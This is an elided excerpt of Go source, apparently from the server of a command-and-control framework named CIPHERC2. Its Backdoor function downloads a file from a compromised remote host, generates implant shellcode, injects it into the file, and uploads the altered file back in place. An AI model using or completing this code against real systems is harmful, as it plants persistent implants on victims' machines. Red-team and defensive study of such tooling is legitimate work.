...
// Backdoor - Inject a CIPHERC2 payload in a file on the remote system
func (rpc *Server) Backdoor(ctx context.Context, req *clientpb.BackdoorReq) (*clientpb.Backdoor, error) {
	...
	download, err := rpc.Download(context.Background(), &CIPHERC2pb.DownloadReq{
	...
	fPath, err := generate.CIPHERC2Shellcode(name, build, p.Config, httpC2Config.ImplantConfig)
	if err != nil {
		return nil, status.Error(codes.Internal, err.Error())
	}
	...
	upload, err := rpc.Upload(context.Background(), &CIPHERC2pb.UploadReq{
		Encoder: "gzip",
		Data:    uploadGzip,
		Path:    req.FilePath,
		Request: &commonpb.Request{
